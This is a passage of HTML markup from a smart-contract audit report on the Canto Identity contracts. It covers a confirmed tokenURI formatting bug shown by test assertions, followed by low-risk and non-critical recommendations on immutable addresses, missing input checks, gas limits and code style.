class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// These pass — the raw bytes &#39;0000000000000000000000000000000000000000000000000000000000000001&#39; are interpolated as _id.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">string</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hex</span><span class=\"mtk8\">&quot;7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000012e6a736f6e&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">string</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hex</span><span class=\"mtk8\">&quot;7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000022e6a736f6e&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// These fail - the generated string on the right is not the expected string on the left. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;tbd://base_uri/1.json&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;tbd://base_uri/2.json&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cidNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89#issuecomment-1426179080\">OpenCoreCH (Canto Identity) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Great catch!</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 23 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/75\">report highlighted below</a> by <strong>HardlyDifficult</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/183\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/181\">JC</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/178\">libratus</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/174\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/167\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/155\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/151\">enckrish</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/148\">0xAgro</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/142\">sorrynotsorry</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/126\">SleepingBugs</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/119\">merlin</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/118\">DevABDee</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/111\">Matin</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/90\">shark</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/81\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/78\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/70\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/69\">brevis</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/35\">btk</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/28\">nicobevi</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/13\">hihen</a>, and <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/8\">chaduke</a>.</em></p>\n<h2 id=\"l-01-consider-allowing-the-subprotocol-owner-to-be-transferred\" style=\"position:relative;\"><a href=\"#l-01-consider-allowing-the-subprotocol-owner-to-be-transferred\" aria-label=\"l 01 consider allowing the subprotocol owner to be transferred permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Consider allowing the subprotocol owner to be transferred</h2>\n<p>Once a subprotocol has been registered in the <code>SubprotocolRegistry</code> there is no way to update any of the values. The <code>SubprotocolData.owner</code> is the fee recipient leveraged as the fee recipient in <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L193\"><code>CidNFT.add</code></a> - which means it may continue to collect fees overtime.</p>\n<p>Since subprotocols are created by more than just the inner dev team, it may be more likely that the wallet becomes compromised or the subprotocol team desires switching to a multisig address in the future.</p>\n<p>You could allow transferring the <code>owner</code> to another address, potentially with a 2-step process. This would not negatively impact use of the subprotocol, nor change the associated gas costs.</p>\n<p>Similarly, consider allowing other fields to be updated. For example, maybe the subprotocol owner can lower the <code>fee</code> at any point but not increase it.</p>\n<h2 id=\"l-02-consider-allowing-fee-wallet-transfers\" style=\"position:relative;\"><a href=\"#l-02-consider-allowing-fee-wallet-transfers\" aria-label=\"l 02 consider allowing fee wallet transfers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Consider allowing fee wallet transfers</h2>\n<p><code>cidFeeWallet</code> in <code>SubprotocolRegistry</code> and <code>CidNFT</code> are currently immutable addresses. Allowing the fee recipient to be updated may be appropriate for future proofing such as to allow moving the fee recipient under DAO control, or similar change.</p>\n<p>You could allow transferring to another address, potentially with a 2-step process. However this would increase gas costs as immutable could no longer be used.</p>\n<p>An alternative which preserves the current gas efficiency, is to use a simple contract as the wallet which escrows funds that can be withdrawn by its owner, which potentially uses <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol\">the OZ Ownable2Step mixin</a>. The owner could be an EOA at first, and as the system matures it could be changed to a multisig or a DAO in the future.</p>\n<h2 id=\"l-03-consider-a-mutable-baseuri\" style=\"position:relative;\"><a href=\"#l-03-consider-a-mutable-baseuri\" aria-label=\"l 03 consider a mutable baseuri permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Consider a mutable baseURI</h2>\n<p><code>baseURI</code> is assigned in the constructor with no way of updating it in the future. The approach used by <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L140\"><code>tokenURI</code></a> prevents using IPFS since that would require knowing all potential tokenIds in advance. It may work with Arweave’s append only file system, but the intended baseURI protocol is not clear from the docs or tests.</p>\n<p>If these are to be hosted on a custom domain, it may be even more important that the <code>baseURI</code> is mutable, allowing it to be transitioned to a new store if that domain were to become unavailable (such as due to a security incident, trademark issue, or the host otherwise becoming unavailable in the future).</p>\n<p>Alt: clarify in the docs the intended <code>baseURI</code>, to make it clear how permanence is guaranteed if that’s part of the current launch plan.</p>\n<h2 id=\"l-04-consider-requiring-strings-length--0\" style=\"position:relative;\"><a href=\"#l-04-consider-requiring-strings-length--0\" aria-label=\"l 04 consider requiring strings length  0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Consider requiring strings <code>.length != 0</code></h2>\n<p>Several strings in the system are assigned once, without the ability to change it later on. Consider requiring that these are non-zero length to help ensure these have been assigned as expected.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L84\">SubprotocolRegistry.register</a> accepts a <code>_name</code> parameter of any length. Although only one entry could be registered with an empty name, it may be odd or unexpected to have a subprotocol with an empty string.</li>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L122\">CidNFT.costructor</a> accepts a <code>_baseURI</code> parameter of any length which is then immutable. If this were not assigned then <code>tokenURI</code> would not work as expected.</li>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L126\"><code>name</code> and <code>symbol</code> in <code>CidNFT.constructor</code></a> are allowed to be empty in the solmate constructor, may consider adding 0 length checks for these as well.</li>\n</ul>\n<h2 id=\"l-05-consider-iscontract-checks-in-constructors\" style=\"position:relative;\"><a href=\"#l-05-consider-iscontract-checks-in-constructors\" aria-label=\"l 05 consider iscontract checks in constructors permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Consider <code>isContract</code> checks in constructors</h2>\n<p>Several addresses are assigned in the contract constructors and assigned to immutable variables. A successful deployment is sensitive to these addresses being assigned correctly for the current network, and that addresses were specified in the correct order. Consider adding checks, as aggressively as possible for the use case, to help ensure the deployment configuration is correct.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L37\"><code>AddressRegistry.constructor</code></a> consider requiring that <code>_cidNFT.isContract()</code>.</li>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L66\"><code>SubprotocolRegistry.constructor</code></a> and <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L129\"><code>CidNFT.constructor</code></a> consider requiring that <code>_noteContract.isContract()</code>.</li>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L66\"><code>CidNFT.constructor</code></a> consider requiring that <code>_subprotocolRegistry.isContract()</code>.</li>\n</ul>\n<p><code>.isContract()</code> is referring to the <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L40\">OZ Address library</a> or similar implementation.</p>\n<p>This is related to the automated finding <code>[NC-1] Missing checks for address(0) when assigning values to address state variables</code> but suggests a more aggressive check.</p>\n<h2 id=\"l-06-getactivedata-could-exceed-gas-limits\" style=\"position:relative;\"><a href=\"#l-06-getactivedata-could-exceed-gas-limits\" aria-label=\"l 06 getactivedata could exceed gas limits permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] getActiveData could exceed gas limits</h2>\n<p>There’s no upper bound on the size of the array which is being <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L319-L322\">returned in <code>CidNFT.getActiveData</code></a>. For both contract consumers and RPC requests, eventually a gas limit would be reached. Different RPC providers have different limits applied to view calls such as this.</p>\n<p>Consider supporting a paginated variation where callers can request a subset of the full array when appropriate, as well as potentially a getter to get the length of the array.</p>\n<h2 id=\"n-01-simplify-code\" style=\"position:relative;\"><a href=\"#n-01-simplify-code\" aria-label=\"n 01 simplify code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] Simplify code</h2>\n<p>There is an if/else block in <code>CidNFT.add</code> for the <code>ACTIVE</code> type which could be simplified. Consider <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L215-L226\">changing this block of code</a> into:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Check for duplicates</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">lengthBeforeAddition</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">activeData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIDToAdd</span><span class=\"mtk1\">] != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ActiveArrayAlreadyContainsID</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_subprotocolName</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_nftIDToAdd</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">activeData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">values</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nftIDToAdd</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">activeData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">positions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nftIDToAdd</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">lengthBeforeAddition</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>This is easier to read and functionally the same. </p>\n<h2 id=\"n-02-custom-error-params\" style=\"position:relative;\"><a href=\"#n-02-custom-error-params\" aria-label=\"n 02 custom error params permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] Custom Error Params</h2>\n<p>Consider emitting the current owner in <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L46\"><code>AddressRegistry.NFTNotOwnedByUser</code></a>. <code>msg.sender</code> is included but that may already be clear from context. Including the owner could be a useful addition, e.g. allowing a user to quickly realize that the NFT is in another wallet of theirs.</p>\n<h2 id=\"n-03-emit-fromto\" style=\"position:relative;\"><a href=\"#n-03-emit-fromto\" aria-label=\"n 03 emit fromto permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] Emit from/to</h2>\n<p>Consider emitting the original CID in <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L48\"><code>AddressRegistry.CIDNFTAdded</code></a> for when a user overwrites a prior registration. This may add a little gas overhead, but it should be minor since the slot is warm by setting the value here as well.</p>\n<p>This is similar to <a href=\"https://eips.ethereum.org/EIPS/eip-173\">ERC-173 (the ownership standard)</a> which emits both the previous and new owner on transfer. Including both CIDs would make any overwrites more explicit for the user and any observing apps. When there is no previous CID, that param would emit 0 (similar to previous owner emitted as address(0) when first assigned).</p>\n<p>Alternatively you could emit <code>CIDNFTRemoved</code> when there is a CID being overwritten. This approach would still offer the explicitness, but also be consistent with the <code>remove</code> flow, as if the user had made that call before the new <code>register</code> call.</p>\n<h2 id=\"n-04-consistent-param-ordering\" style=\"position:relative;\"><a href=\"#n-04-consistent-param-ordering\" aria-label=\"n 04 consistent param ordering permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] Consistent param ordering</h2>\n<p>Consider switching the param order in the <code>SubprotocolRegistered</code> event or the <code>register</code> function so that they are more consistent with each other. e.g. in the function, the order/active/primary bits come first while in the event they appear after the <code>_nftAddress</code>.</p>\n<p>A possible improvement:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">register</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_name</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nftAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ordered</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_primary</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_active</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_fee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span></span></span></code></pre>\n<p>The consistency improves readability, both for the code and for users reviewing transactions &#x26; events in a block explorer.</p>\n<h2 id=\"n-05-inconsistent-used-of-named-return-params\" style=\"position:relative;\"><a href=\"#n-05-inconsistent-used-of-named-return-params\" aria-label=\"n 05 inconsistent used of named return params permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-05] Inconsistent used of named return params</h2>\n<p>Personally I prefer named return params, but it is a style preference. However in a project, it’s nice to be consistent throughout with whichever style you prefer.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L106\"><code>SubprotocolRegister.getSubprotocol</code></a> does not name the return value while <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L62\"><code>AddressRegistry.getCID</code></a> does, even though they are very similar functions.</li>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L136\"><code>CidNFT.tokenURI</code></a> and <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L344\"><code>CidNFT.onERC721Received</code></a> do not use named return params while all the other getters in this contract do.</li>\n</ul>\n<h2 id=\"n-06-use-delete-consistently\" style=\"position:relative;\"><a href=\"#n-06-use-delete-consistently\" aria-label=\"n 06 use delete consistently permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 